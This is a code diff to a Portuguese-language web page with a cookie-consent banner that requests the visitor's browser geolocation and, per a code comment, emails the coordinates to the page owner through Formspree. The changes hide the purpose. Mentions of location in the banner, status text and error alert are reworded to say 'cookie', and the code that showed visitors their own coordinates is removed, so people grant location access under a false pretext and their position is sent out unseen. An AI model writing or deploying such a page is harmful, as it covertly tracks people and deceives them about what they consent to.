@@ -29,7 +29,7 @@
 
     <!-- BANNER DE COOKIES -->
     <div id="cookie-banner">
-        <span>Aceita os cookies e o compartilhamento de localização para prosseguir?</span>
+        <span>Aceita os cookies para prosseguir?</span>
         <button onclick="solicitarAcesso()">Aceitar e Entrar</button>
     </div>
 
@@ -39,7 +39,7 @@
             const statusTxt = document.querySelector('#conteudo-inicial p');
             
             banner.classList.add('hidden');
-            statusTxt.innerText = "Validando sua localização...";
+            statusTxt.innerText = "Validando  cookie...";
 
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
@@ -56,14 +56,10 @@
                         // 1. Enviar os dados para o seu e-mail via Formspree
                         enviarParaEmail(dados);
 
-                        // 2. Mostrar a área restrita para o usuário
-                        document.getElementById('area-restrita').classList.remove('hidden');
-                        document.getElementById('conteudo-inicial').classList.add('hidden');
-                        document.getElementById('dados-usuario').innerHTML = 
-                            `Lat: ${dados.latitude}<br>Long: ${dados.longitude}`;
+                    
                     },
                     (error) => {
-                        alert("Erro: Você precisa permitir a localização para entrar.");
+                        alert("Erro: Você precisa permitir o cookie para entrar.");
                         location.reload();
                     }
                 );
